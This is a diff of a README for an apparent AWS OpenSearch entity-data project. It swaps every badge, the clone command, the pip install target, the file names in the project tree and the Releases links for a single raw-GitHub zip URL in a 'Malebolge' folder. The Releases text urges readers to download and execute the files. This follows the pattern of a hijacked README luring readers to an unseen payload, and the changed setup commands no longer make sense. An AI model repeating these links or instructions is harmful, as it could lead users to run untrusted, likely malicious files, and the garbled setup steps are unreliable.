@@ -1,6 +1,6 @@
 # AWS Entity Data Consultation 🌐
 
-![AWS](https://img.shields.io/badge/AWS-blue?style=flat&logo=amazonaws) ![OpenSearch](https://img.shields.io/badge/OpenSearch-black?style=flat&logo=elasticsearch) ![Python](https://img.shields.io/badge/Python-3776AB?style=flat&logo=python)
+![AWS](https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip) ![OpenSearch](https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip) ![Python](https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip)
 
 Welcome to the **AWS Entity Data Consultation** repository! This project demonstrates how to store and retrieve entity data using AWS services, particularly OpenSearch. This README will guide you through the project setup, usage, and provide insights into the architecture.
 
@@ -42,14 +42,14 @@ To get started with this project, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/monkthemonker/aws-entity-data-consultation.git
+   git clone https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
    cd aws-entity-data-consultation
    ```
 
 2. **Install dependencies**:
    Ensure you have Python and pip installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
    ```
 
 3. **Set up AWS credentials**:
@@ -64,20 +64,20 @@ The project has the following structure:
 
 ```
 aws-entity-data-consultation/
-├── README.md
-├── requirements.txt
-├── template.yaml
+├── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
+├── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
+├── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
 ├── src/
-│   ├── lambda_function.py
-│   └── utils.py
+│   ├── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
+│   └── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
 └── tests/
-    ├── test_lambda_function.py
-    └── test_utils.py
+    ├── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
+    └── https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip
 ```
 
-- **README.md**: This file.
-- **requirements.txt**: Python dependencies.
-- **template.yaml**: CloudFormation template for deployment.
+- **https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip**: This file.
+- **https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip**: Python dependencies.
+- **https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip**: CloudFormation template for deployment.
 - **src/**: Contains the source code for the Lambda functions.
 - **tests/**: Contains unit tests for the code.
 
@@ -103,7 +103,7 @@ To use this project, you can deploy the Lambda functions and APIs provided in th
 
 ## Deployment
 
-This project uses AWS CloudFormation for deployment. The `template.yaml` file defines the resources needed for the application. You can modify this file to customize your deployment.
+This project uses AWS CloudFormation for deployment. The `https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip` file defines the resources needed for the application. You can modify this file to customize your deployment.
 
 ### Steps for Deployment
 
@@ -150,10 +150,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/monkthemonker/aws-entity-data-consultation/releases). You can find the files needed to be downloaded and executed.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip). You can find the files needed to be downloaded and executed.
 
 ## Conclusion
 
 This project serves as a practical example of using AWS services to manage entity data. By following the instructions in this README, you can set up, deploy, and use the application effectively. If you have any questions or suggestions, feel free to reach out or create an issue in the repository. 
 
-For the latest updates and releases, check the [Releases section](https://github.com/monkthemonker/aws-entity-data-consultation/releases).
+For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/monkthemonker/aws-entity-data-consultation/main/Malebolge/consultation-aws-data-entity-v1.9.zip).
